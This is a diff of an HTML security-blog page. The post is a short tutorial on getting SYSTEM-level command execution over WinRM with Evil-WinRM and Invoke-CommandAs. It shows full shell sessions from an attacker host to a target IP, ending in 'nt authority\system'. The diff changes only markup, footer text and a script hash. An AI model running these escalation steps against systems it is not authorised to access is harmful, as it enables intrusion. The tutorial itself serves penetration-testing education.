@@ -124,7 +124,7 @@ First off, let me introduce my tool of choice here. It&rsquo;s Evil-WinRM. I spo
 
             <div class="post-content">
                 <p>This is a quick blog post on how to elevate to SYSTEM without the need for PSEXEC when you are using PowerShell, or more specifcially in this case, PowerShell Remoting (WinRM).</p>
-<p>First off, let me introduce my tool of choice here. It&rsquo;s <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>. I spoke about it in the Practical Exploitation video here: <a href="https://www.youtube.com/watch?v=tVgJ-9FJKxE,">https://www.youtube.com/watch?v=tVgJ-9FJKxE,</a> so I won&rsquo;t go too far indepth. It&rsquo;s essentially the only WinRM tool that I&rsquo;ve found to work well in a non-Windows native situation (also you can proxy it through proxychains which is AWESOME!!).</p>
+<p>First off, let me introduce my tool of choice here. It&rsquo;s <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>. I spoke about it in the Practical Exploitation video here: <a href="https://www.youtube.com/watch?v=tVgJ-9FJKxE">https://www.youtube.com/watch?v=tVgJ-9FJKxE</a>, so I won&rsquo;t go too far indepth. It&rsquo;s essentially the only WinRM tool that I&rsquo;ve found to work well in a non-Windows native situation (also you can proxy it through proxychains which is AWESOME!!).</p>
 <p>Anyways.</p>
 <p>I want to document how to run commands as <strong>SYSTEM</strong> without the use of PSEXEC. I found this technique on a <a href="https://4sysops.com">4sysops blog</a> post called <a href="https://4sysops.com/archives/running-powershell-remotely-as-system-with-invoke-commandas/">Running PowerShell Remotely As System with Invoke-CommandAs</a>. <em>Side-note</em> you should definitely bookmark thier blog it&rsquo;s great.</p>
 <p><strong>Invoke-CommandAs</strong> is not a native function of PowerShell, so you need to download it from the original author&rsquo;s Github repo: <a href="https://github.com/mkellerman/Invoke-CommandAs">https://github.com/mkellerman/Invoke-CommandAs</a></p>
@@ -134,7 +134,7 @@ First off, let me introduce my tool of choice here. It&rsquo;s Evil-WinRM. I spo
 <li><a href="https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1">https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1</a></li>
 </ol>
 <p>Here you can see me putting those two files into a <code>scripts</code> directory I made inside of the Evil-WinRM folder. (<code>git clone https://github.com/Hackplayers/evil-winrm</code> + <code>bundle install</code>)</p>
-<pre><code>root@attacker:~/evil-winrm/scripts# ls
+<pre tabindex="0"><code>root@attacker:~/evil-winrm/scripts# ls
 Invoke-CommandAs.ps1
 root@attacker:~/evil-winrm/scripts# wget https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-
 --2020-09-13 20:17:56--  https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps
@@ -142,13 +142,13 @@ Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.1
 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 10009 (9.8K) [text/plain]
-Saving to: 'Invoke-ScheduledTask.ps1'
+Saving to: &#39;Invoke-ScheduledTask.ps1&#39;
 
 Invoke-ScheduledTask.ps1                      100%[===========================================================================================
 
-2020-09-13 20:17:56 (5.37 MB/s) - 'Invoke-ScheduledTask.ps1' saved [10009/10009]
+2020-09-13 20:17:56 (5.37 MB/s) - &#39;Invoke-ScheduledTask.ps1&#39; saved [10009/10009]
 </code></pre><p>Once that&rsquo;s ready, I run Evil-WinRM with the <code>-s</code> flag and specify the <code>scripts</code> directory I put the two files in.</p>
-<pre><code>root@attacker:~/evil-winrm# ruby evil-winrm.rb -i 192.168.80.10 -u uberuser -s scripts/
+<pre tabindex="0"><code>root@attacker:~/evil-winrm# ruby evil-winrm.rb -i 192.168.80.10 -u uberuser -s scripts/
 Enter Password:
 
 Evil-WinRM shell v2.3
@@ -157,17 +157,17 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\uberuser\Documents&gt;
 </code></pre><p>Once I have the shell I load each of the scripts by typing out their file names (tab complete should work)</p>
-<pre><code>*Evil-WinRM* PS C:\Users\uberuser\Documents&gt; Invoke-ScheduledTask.ps1
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\uberuser\Documents&gt; Invoke-ScheduledTask.ps1
 *Evil-WinRM* PS C:\Users\uberuser\Documents&gt; Invoke-CommandAs.ps1
 </code></pre><p>Once they are loaded you need to run the <code>menu</code> command to load the functions into memory on the attackers side. I haven&rsquo;t looked at the code enough to know exactly why this is needed, but it doesn&rsquo;t seem to work if you don&rsquo;t.</p>
-<pre><code>*Evil-WinRM* PS C:\Users\uberuser\Documents&gt; menu
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\uberuser\Documents&gt; menu
 
-   ,.   (   .      )               &quot;            ,.   (   .      )       .
-  (&quot;  (  )  )'     ,'             (`     '`    (&quot;     )  )'     ,'   .  ,)
-.; )  ' (( (&quot; )    ;(,      .     ;)  &quot;  )&quot;  .; )  ' (( (&quot; )   );(,   )((
-_&quot;.,_,.__).,) (.._( ._),     )  , (._..( '.._&quot;._, . '._)_(..,_(_&quot;.) _( _')
+   ,.   (   .      )               &#34;            ,.   (   .      )       .
+  (&#34;  (  )  )&#39;     ,&#39;             (`     &#39;`    (&#34;     )  )&#39;     ,&#39;   .  ,)
+.; )  &#39; (( (&#34; )    ;(,      .     ;)  &#34;  )&#34;  .; )  &#39; (( (&#34; )   );(,   )((
+_&#34;.,_,.__).,) (.._( ._),     )  , (._..( &#39;.._&#34;._, . &#39;._)_(..,_(_&#34;.) _( _&#39;)
 \_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
- |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
+ |    __)_\  \/ /  |  |    ;_)_&#39;) \   \/\/   /  |/    \|       _/ /  \ /  \
  |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
 /_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
         \/                               \/          \/       \/         \/
@@ -180,7 +180,7 @@ _&quot;.,_,.__).,) (.._( ._),     )  , (._..( '.._&quot;._, . '._)_(..,_(_&quot;
 [+] Invoke-CommandAs
 [+] Invoke-ScheduledTask
 </code></pre><p>As we can see both of the needed functions are loaded and we can finally issue our commands as SYSTEM with the <code>-AsSystem</code> flag and the command being <code>whoami</code>:</p>
-<pre><code>*Evil-WinRM* PS C:\Users\uberuser\Documents&gt; Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\uberuser\Documents&gt; Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
 nt authority\system
 *Evil-WinRM* PS C:\Users\uberuser\Documents&gt;
 </code></pre>
@@ -210,7 +210,7 @@ nt authority\system
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -218,7 +218,7 @@ nt authority\system
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -231,7 +231,7 @@ nt authority\system
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
